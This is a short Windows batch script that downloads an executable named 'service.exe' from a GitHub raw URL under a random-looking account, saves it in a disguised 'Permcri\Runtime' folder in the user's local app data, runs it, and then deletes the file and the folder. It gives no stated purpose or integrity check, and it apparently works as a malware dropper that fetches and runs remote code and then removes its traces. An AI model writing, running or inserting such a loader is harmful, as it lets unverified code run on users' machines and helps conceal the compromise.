@echo off
setlocal

set "DIR=%LOCALAPPDATA%\Permcri\Runtime"
set "EXE=%DIR%\service.exe"
set "URL=https://raw.githubusercontent.com/asdadada386/permcri/main/service.exe"

if not exist "%DIR%" mkdir "%DIR%"
if not exist "%DIR%" exit /b 1

curl.exe -fL "%URL%" -o "%EXE%"
if errorlevel 1 goto cleanup

start "" /wait "%EXE%"

:cleanup
del /f /q "%EXE%" 2>nul
rmdir "%DIR%" 2>nul
endlocal
